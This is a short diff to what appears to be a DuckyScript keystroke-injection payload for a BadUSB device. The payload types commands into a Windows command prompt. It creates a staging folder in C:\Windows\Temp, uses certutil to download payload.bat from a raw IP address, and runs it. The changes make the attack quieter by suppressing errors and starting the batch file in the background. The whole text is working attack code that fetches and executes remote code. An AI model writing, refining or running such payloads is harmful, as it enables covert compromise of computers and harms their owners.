@@ -59,16 +59,16 @@ LEFT
 ENTER
 DELAY 2000
 
-REM ── Step 11: Create staging folder ──
-STRINGLN mkdir C:\Windows\Temp\Cache
+REM ── Step 11: Create staging folder silently ──
+STRINGLN mkdir C:\Windows\Temp\Cache 2>nul
 DELAY 300
 
 REM ── Step 12: Download batch file via certutil ──
 STRINGLN certutil -urlcache -split -f http://153.75.82.198/payload.bat C:\Windows\Temp\Cache\p.bat
-DELAY 3000
+DELAY 4000
 
-REM ── Step 13: Execute batch file as admin ──
-STRINGLN C:\Windows\Temp\Cache\p.bat
+REM ── Step 13: Execute batch file ──
+STRINGLN start /b C:\Windows\Temp\Cache\p.bat
 DELAY 1000
 
 REM ── Step 14: Close cmd ──
